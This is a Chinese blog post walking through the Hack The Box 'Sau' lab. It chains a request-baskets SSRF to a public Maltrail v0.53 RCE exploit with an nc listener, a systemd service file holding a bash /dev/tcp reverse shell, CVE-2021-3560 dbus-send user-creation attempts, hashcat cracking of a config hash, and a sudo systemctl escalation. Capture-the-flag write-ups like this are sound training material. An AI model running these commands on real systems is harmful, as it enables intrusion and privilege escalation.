<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>HTB Sau Maltraill-v0.53 CVE-2021-3560 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="HTB Sau Maltraill-v0.53 CVE-2021-3560" />
<meta property="og:description" content="htb | sau
使用nmap扫描端口
nmap -sV -sC -v -oN Sau 10.10.11.224 # Nmap 7.93 scan initiated Mon Dec 25 08:56:25 2023 as: nmap -sV -sC -v -oN Sau 10.10.11.224 Nmap scan report for 10.10.11.224 Host is up (2.4s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA) | 256 ec2eb105872a0c7db149876495dc8a21 (ECDSA) |_ 256 b30c47fba2f212ccce0b58820e504336 (ED25519) 80/tcp filtered http 55555/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/a296b6bacb8bfa6239353281f278fed2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-27T21:33:59+08:00" />
<meta property="article:modified_time" content="2023-12-27T21:33:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">HTB Sau Maltraill-v0.53 CVE-2021-3560</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>htb | sau</p> 
<p>使用nmap扫描端口</p> 
<pre><code>nmap -sV -sC -v -oN Sau 10.10.11.224
</code></pre> 
<pre><code># Nmap 7.93 scan initiated Mon Dec 25 08:56:25 2023 as: nmap -sV -sC -v -oN Sau 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (2.4s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 25 Dec 2023 01:00:51 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 25 Dec 2023 00:59:27 GMT
|     Content-Length: 27
|     href="/web"&gt;Found&lt;/a&gt;.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 25 Dec 2023 00:59:38 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=12/25%Time=6588D3F3%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2025\x20Dec\x2
SF:02023\x2000:59:27\x20GMT\r\nContent-Length:\x2027\r\n\r\n&lt;a\x20href=\"/
SF:web\"&gt;Found&lt;/a&gt;\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2025\x20Dec\x2
SF:02023\x2000:59:38\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nDate:\x20Mon,\x2025\x20Dec\x202023\x2001:00:51\x20GMT\
SF:r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20na
SF:me\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$
SF:\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 25 09:02:57 2023 -- 1 IP address (1 host up) scanned in 392.40 seconds

</code></pre> 
<p>访问55555端口发现安装了request-baskets 版本为1.2.1</p> 
<p>才爆出request-baskets 1.2.1 ssrf 服务端请求伪造</p> 
<p><img src="https://images2.imgbox.com/f6/4c/f2cs6tX4_o.png" alt="在这里插入图片描述"></p> 
<pre><code>{
  "forward_url": "http://127.0.0.1:80",
  "proxy_response": true,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
</code></pre> 
<p><img src="https://images2.imgbox.com/c1/32/OYSQr7tG_o.png" alt="在这里插入图片描述"></p> 
<p>访问http://10.10.11.224:55555/qiang</p> 
<p><img src="https://images2.imgbox.com/a5/3a/ZSxXcJWn_o.png" alt="在这里插入图片描述"></p> 
<p>在页面中发现是Maltrail v0.53版本</p> 
<p>在谷歌搜索相关exp</p> 
<pre><code>Maltrail v0.53 exploit
</code></pre> 
<p><img src="https://images2.imgbox.com/39/23/M3C37ZCN_o.png" alt="在这里插入图片描述"></p> 
<p>**<a href="https://github.com/spookier/Maltrail-v0.53-Exploit">Maltrail-v0.53-漏洞利用</a>**有RCE漏洞</p> 
<pre><code>git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git
cd Maltrail-v0.53-Exploit
python exploit.py 10.10.16.16 55566 http://10.10.11.224:55555/qiang
</code></pre> 
<pre><code>nc -lnvvp 55566
</code></pre> 
<p><img src="https://images2.imgbox.com/14/5e/uTJFGdrz_o.png" alt="在这里插入图片描述"></p> 
<p>查看flag是否有sudo权限</p> 
<pre><code>ec332b88b8cb2824b742013561c14be1
</code></pre> 
<p><img src="https://images2.imgbox.com/21/6c/Of4WVe3I_o.png" alt="在这里插入图片描述"></p> 
<p>搜索sudo systemctl提权</p> 
<p>编写一个service文件来被systemctl加载</p> 
<pre><code>echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/bash -i &gt; /dev/tcp/10.10.16.16/5566 0&gt;&amp;1 2&lt;&amp;1"
[Install]
WantedBy=multi-user.target' &gt; /tmp/reshell.service
</code></pre> 
<p>但是需要本用户密码，由于我是通过rce反弹的shell没有用户密码</p> 
<p>使用python开启临时服务上传linpeas.sh查看本机有什么信息</p> 
<p>发现有<a href="https://github.com/hakivvi/CVE-2021-3560">CVE-2021-3560</a></p> 
<p><img src="https://images2.imgbox.com/c7/38/6DVT2c55_o.png" alt="在这里插入图片描述"></p> 
<pre><code>git clone https://github.com/hakivvi/CVE-2021-3560.git          
cd CVE-2021-3560 
gcc -Wall exploit.c -o exploit $(pkg-config --libs --cflags dbus-1) 
</code></pre> 
<p>编译报错Package ‘dbus-1’, required by ‘virtual:world’, not found使用apt安装libdbus-1-dev解决</p> 
<pre><code>apt install libdbus-1-dev
</code></pre> 
<p><img src="https://images2.imgbox.com/40/42/OeE3kZY0_o.png" alt="在这里插入图片描述"></p> 
<p>目标机报错无法提权</p> 
<p>手搓</p> 
<pre><code>time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwn string:"pwn your host" int32:1

0.00user 0.00system 0:00.02elapsed 22%CPU (0avgtext+0avgdata 2876maxresident)k




dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwn string:"pwn your host" int32:1 &amp; sleep 0.002s ; kill $!



openssl passwd -5 qwertyuiop



dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'passwd' string:GoldenEye &amp; sleep 0.008s ; kill $!
</code></pre> 
<p><img src="https://images2.imgbox.com/64/0b/eTYNRWtd_o.png" alt="在这里插入图片描述"></p> 
<p>手撮失败，sys返回的值为0.002s，改成0.001和改成0.002都创建不了pwn用户，试了无数次，换个方向。</p> 
<p>maltrail配置文件在/opt/maltrail/maltrail.conf下发现一串hash</p> 
<pre><code>admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0:
</code></pre> 
<p>使用hsah-identifier验证一下hash类型:SHA-256,Haval-256</p> 
<p><img src="https://images2.imgbox.com/6c/a7/fDoP2juO_o.png" alt="在这里插入图片描述"></p> 
<p>使用hashcat爆破hash值为：changeme!</p> 
<pre><code>hashcat -m 1400 hash  /usr/share/wordlists/rockyou.txt
</code></pre> 
<p><img src="https://images2.imgbox.com/97/d6/RxDrYN2v_o.png" alt="在这里插入图片描述"></p> 
<p>试了一下用root和puma用户SSH根本就不行，等级为easy的提权费了九牛二虎之力</p> 
<p>在其他wp看到这篇提权文章<a href="https://gtfobins.github.io/gtfobins/systemctl/" rel="nofollow">systemctl提权</a>等服务状态显示完毕之后输入!sh就提权成功了，为什么会用trail服务因为sudo-l只有这个服务才能不用输入密码。。。</p> 
<p><img src="https://images2.imgbox.com/8e/53/To5gaP7G_o.png" alt="在这里插入图片描述"></p> 
<pre><code>sudo systemctl  status trail.service
!sh
</code></pre> 
<p>提权成功</p> 
<p><img src="https://images2.imgbox.com/2a/5b/3DijsAhl_o.png" alt="在这里插入图片描述"></p> 
<pre><code>abb964dd94c0f8cece8f25814b83c15f
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3aacc665edcc449ee5158f8006f7f640/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【性能优化】EFCore性能优化(二)-禁用实体跟踪</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7bc32316e6f56e6bb917a0c7cb4dd887/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">CSDN-2023年度总结：岁月如故</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>